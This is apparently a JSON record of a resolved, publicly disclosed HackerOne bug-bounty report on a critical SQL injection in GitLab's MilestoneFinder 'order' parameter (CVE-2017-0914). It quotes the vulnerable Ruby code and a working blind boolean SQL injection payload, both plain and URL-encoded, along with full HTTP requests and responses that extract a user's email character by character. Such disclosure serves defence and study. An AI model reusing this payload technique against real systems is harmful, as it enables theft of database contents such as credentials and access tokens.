@@ -1,0 +1,135 @@
+{
+  "id": 298176,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTgxNzY=",
+  "url": "https://hackerone.com/reports/298176",
+  "title": "SQL injection in MilestoneFinder order method",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-15T03:15:38.095Z",
+  "submitted_at": "2017-12-15T03:15:38.095Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2017-0914"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-04-27T02:20:24.581Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-04-25T23:41:53.335Z",
+  "team_member_agreed_on_going_public_at": "2018-04-27T02:20:24.222Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The `MilestoneFinder` is a class used to find milestones based on group or project identifiers. The class is used in multiple controllers. It allows to filter based on state and can be used to order the result set. One of the uses can be found in the `Groups::MilestonesController`. When the **index** action is requested, the `milestones` method is called. Here's the first two lines of the method:\n\n**app/controllers/groups/milestones_controller.rb**\n```ruby\ndef milestones\n    search_params = params.merge(group_ids: group.id)\n\n    milestones = MilestonesFinder.new(search_params).execute\n    # ...\n```\n\nThis code takes all the parameters, merges the group found in the URL (that your account is authorized for) and calls the `execute` method. Here's the method:\n\n**app/finders/milestone_finder.rb**\n```ruby\n  def execute\n    return Milestone.none if project_ids.empty? && group_ids.empty?\n\n    items = Milestone.all\n    items = by_groups_and_projects(items)\n    items = by_title(items)\n    items = by_state(items)\n\n    order(items)\n  end\n```\n\nThe `order` call on the last line is implemented as following: \n\n**app/finders/milestone_finder.rb**\n```ruby\n def order(items)\n    if params.has_key?(:order)\n      items.reorder(params[:order])\n    else\n      order_statement = Gitlab::Database.nulls_last_order('due_date', 'ASC')\n      items.reorder(order_statement)\n    end\n  end\n```\n\nAs can be seen on line 2 of the method, `reorder` is called without any form of sanitization. This leads to a SQL injection. To verify, create a new group on a GitLab instance. Then, create two milestones. To exploit this vulnerability a payload needs to be generated. To do so, start by sending a JSON request to the group milestones endpoint. Here's a request example:\n\n**Request**\n```\nGET /groups/my-test-group/-/milestones HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n```\n\n**Response**\n```json\n[\n  {\n    \"title\": \"3\",\n    \"name\": \"3\",\n    \"id\": 429944\n  },\n  {\n    \"title\": \"4\",\n    \"name\": \"4\",\n    \"id\": 429943\n  }\n]\n```\n\nThen, consider the following SQL injection payload:\n\n```sql\n(CASE SUBSTR((SELECT email FROM users WHERE username = 'jobertabma'), 1, 1) WHEN 'a' THEN (CASE id WHEN 429944 THEN 2 ELSE 1 END) ELSE 1 END)\n```\n\nThis payload does three things: it fetches the `email` column from the `users` table where the `username` matches my own username. This can be any query that the attacker wants to execute on the database server. Then, it takes the first character of the `email` (the `SUBSTR(<>, 1, 1)` call) and compares that to a `a`. If that's the case, it'll compare the `id` of the current milestone to `429944`. If that is true, it'll sort on column number 2. If that is **not** the case, it'll sort on column number 1. The order of both milestones in the response will reveal whether the first character of the email address matches the character `a`.\n\nTo prepare the payload, replace `429944` in the payload with a milestone ID of your account and URL encode it:\n\n**Encoded payload**\n```\n%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29\n```\n\nNow submit the first request:\n\n**Request 1 (`a`)**\n```\nGET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27a%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n```\n\n**Response 1**\n```\nHTTP/1.1 200 OK\nServer: nginx\n...\n\n[{\"title\":\"3\",\"name\":\"3\",\"id\":429944},{\"title\":\"4\",\"name\":\"4\",\"id\":429943}]\n```\n\nIn the response above the milestones are sorted **descending** based on the ID. The attacker can enumerate over all characters. When it would send a payload that checks for the letter `j`, the following behavior is observer:\n\n**Request 2 (`j`)**\n```\nGET /groups/xxxaowudhaiwudhaiwudhb/-/milestones?state=open&&order=%28CASE%20SUBSTR%28%28SELECT%20email%20FROM%20users%20WHERE%20username%20%3D%20%27jobertabma%27%29%2C%201%2C%201%29%20WHEN%20%27j%27%20THEN%20%28CASE%20id%20WHEN%20429944%20THEN%202%20ELSE%201%20END%29%20ELSE%201%20END%29 HTTP/1.1\nHost: gitlab.com\nAccept: application/json\n...\n```\n\n**Response 2**\n```\nHTTP/1.1 200 OK\nServer: nginx\n...\n\n[{\"title\":\"4\",\"name\":\"4\",\"id\":429943},{\"title\":\"3\",\"name\":\"3\",\"id\":429944}]\n```\n\nBecause the first character of my email is actually `j`, the result is now sorted by the title of the milestones. An attacker can enumerate over all characters of a column and observe the order. Once the order reverses it knows what the value of the character is. The index of the `SUBSTR` function can be changed to guess characters on other positions of the value.\n\nThis has been tested against GitLab 10.2.4 (the latest version, also used on gitlab.com).\n\n## Impact\n\nAn attacker can extract all information from the a GitLab instance's database, including private access and shell tokens. These can be used to elevate the user's privileges, which may lead to arbitrary code execution.",
+  "bounty_amount": "2000.0",
+  "formatted_bounty": "$2,000",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-05-25T23:41:53.426Z",
+  "allow_singular_disclosure_after": -251048553.40264034,
+  "singular_disclosure_allowed": true,
+  "vote_count": 41,
+  "voters": [
+    "jokebookservice1",
+    "sp1d3rs",
+    "holyfield",
+    "ramsexy",
+    "0xacb",
+    "europa",
+    "bull",
+    "muon4",
+    "jobert",
+    "ali",
+    "and 31 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
